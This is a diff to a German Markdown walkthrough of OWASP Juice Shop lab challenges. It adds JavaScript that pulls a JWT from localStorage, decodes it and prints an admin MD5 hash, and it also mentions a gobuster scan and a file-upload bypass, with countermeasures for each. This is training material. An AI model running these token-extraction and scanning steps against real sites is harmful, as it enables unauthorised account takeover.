@@ -18,7 +18,135 @@ Passwort: (beliebig)
 
 ---
 
-## 2. Directory Scanning - Versteckte Dateien finden
+## 2. JWT Token Dekodierung - Admin Passwort via localStorage
+
+### 📝 Beschreibung
+Eine fortgeschrittene Methode, um das Admin-Passwort durch Dekodierung des JWT-Tokens aus dem localStorage zu ermitteln. Der Token enthält verschlüsselte Benutzerinformationen, einschließlich des Admin-Passworts als MD5-Hash.
+
+### 🔍 Schritt 1: JWT Token aus localStorage extrahieren
+
+```javascript
+// Nach dem Login als normaler User
+const token = localStorage.getItem('token');
+console.log('JWT Token:', token);
+```
+
+### 🔍 Schritt 2: JWT Token dekodieren
+
+```javascript
+// JWT besteht aus 3 Teilen: Header.Payload.Signature
+const parts = token.split('.');
+const payload = parts[1];
+
+// Base64 dekodieren
+const decodedPayload = atob(payload);
+console.log('Decoded Payload:', decodedPayload);
+
+// Als JSON parsen
+const tokenData = JSON.parse(decodedPayload);
+console.log('Token Data:', tokenData);
+```
+
+### 🔍 Schritt 3: Admin-Informationen extrahieren
+
+```javascript
+// Suche nach Admin-relevanten Daten im Token
+console.log('User Data:', tokenData.data);
+
+// Oft enthält der Token Informationen über alle User oder Admin-Hashes
+// Beispiel für typische Token-Struktur:
+/*
+{
+  "data": {
+    "id": 1,
+    "username": "admin",
+    "email": "admin@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500", // MD5 Hash
+    "role": "admin"
+  }
+}
+*/
+```
+
+### 🔍 Schritt 4: MD5-Hash cracken
+
+```javascript
+// Gefundener MD5 Hash (Beispiel)
+const adminHash = "0192023a7bbd73250516f069df18b500";
+console.log('Admin MD5 Hash:', adminHash);
+
+// Online MD5 Decoder verwenden oder lokale Tools:
+// Hash entspricht oft: "admin123"
+```
+
+### 🛠️ Kompletter Exploit-Code
+
+```javascript
+// Vollständiger Workflow
+function extractAdminPassword() {
+    // 1. Token holen
+    const token = localStorage.getItem('token');
+    if (!token) {
+        console.log('❌ Kein Token gefunden - erst einloggen!');
+        return;
+    }
+    
+    try {
+        // 2. JWT dekodieren
+        const parts = token.split('.');
+        const payload = JSON.parse(atob(parts[1]));
+        
+        console.log('📋 JWT Payload:', payload);
+        
+        // 3. Admin-Daten suchen
+        if (payload.data && payload.data.password) {
+            console.log('🔑 Admin MD5 Hash gefunden:', payload.data.password);
+            console.log('💡 Versuche den Hash zu cracken...');
+            
+            // Häufige Passwörter für MD5-Hashes in Juice Shop
+            const commonPasswords = ['admin123', 'admin', 'password', '123456'];
+            
+            commonPasswords.forEach(pwd => {
+                // Hinweis: In echter Umgebung würde man MD5 Libraries verwenden
+                console.log(`🧪 Teste: ${pwd}`);
+            });
+        }
+        
+        // 4. Alternative: Suche in anderen Token-Bereichen
+        console.log('🔍 Vollständige Token-Struktur:', JSON.stringify(payload, null, 2));
+        
+    } catch (error) {
+        console.log('❌ Fehler beim Dekodieren:', error);
+    }
+}
+
+// Exploit ausführen
+extractAdminPassword();
+```
+
+### 💡 Erklärung
+
+1. **JWT Structure**: JSON Web Tokens bestehen aus 3 Teilen (Header.Payload.Signature)
+2. **Base64 Encoding**: Der Payload ist Base64-kodiert, nicht verschlüsselt
+3. **Information Leakage**: Sensitive Daten wie Passwort-Hashes gehören nicht in JWTs
+4. **MD5 Vulnerability**: MD5-Hashes sind unsicher und leicht zu cracken
+
+### 🚨 Sicherheitslücke
+
+- **Schwachstelle**: Sensitive Daten in JWT-Payload
+- **Impact**: Vollständige Kompromittierung des Admin-Accounts
+- **CVSS**: High (Administrative Privilegien)
+
+### 🛡️ Gegenmaßnahmen
+
+1. **Keine sensitiven Daten in JWTs** - Nur User-ID und Rollen
+2. **Starke Passwort-Hashing** - bcrypt statt MD5
+3. **Token-Verschlüsselung** - JWE statt JWS
+4. **Kurze Token-Lebensdauer** - Automatisches Ablaufen
+
+---
+
+## 3. Directory Scanning - Versteckte Dateien finden
 
 ### 📝 Beschreibung
 Automatisches Scannen der Webapplikation nach versteckten Verzeichnissen und Dateien.
@@ -36,7 +164,7 @@ gobuster dir -u http://localhost:3000 -w common.txt -x js,json,md,txt,pdf --excl
 
 ---
 
-## 3. Admin Route Discovery - JavaScript Analyse
+## 4. Admin Route Discovery - JavaScript Analyse
 
 ### 📝 Beschreibung
 Verschiedene Methoden zur Entdeckung versteckter Admin-Routen durch Analyse des Frontend-Codes.
@@ -293,7 +421,7 @@ path:"web3-sandbox"
 
 ---
 
-## 4. File Upload Bypass - PDF Validation umgehen
+## 5. File Upload Bypass - PDF Validation umgehen
 
 ### 📝 Beschreibung
 Die Juice Shop prüft bei File Uploads nur die Dateiendung, nicht den tatsächlichen Inhalt. Dies ermöglicht das Hochladen von beliebigen Dateien als PDFs.
@@ -335,14 +463,16 @@ mv test.xml test.pdf
 ## 📚 Zusammenfassung der Schwachstellen
 
 1. **SQL Injection**: Fehlende Input-Validierung
-2. **Information Disclosure**: Exposed Routes in JavaScript
-3. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
-4. **File Upload**: Unzureichende Dateivalidierung
+2. **JWT Token Exposure**: Sensitive Daten in localStorage
+3. **Information Disclosure**: Exposed Routes in JavaScript
+4. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
+5. **File Upload**: Unzureichende Dateivalidierung
 
 ## 🛡️ Empfohlene Gegenmaßnahmen
 
 1. **SQL Injection**: Prepared Statements verwenden
-2. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
-3. **File Validation**: MIME-Type und Magic Bytes prüfen
-4. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
+2. **JWT Security**: Keine sensitiven Daten in Tokens, sichere Speicherung
+3. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
+4. **File Validation**: MIME-Type und Magic Bytes prüfen
+5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
 
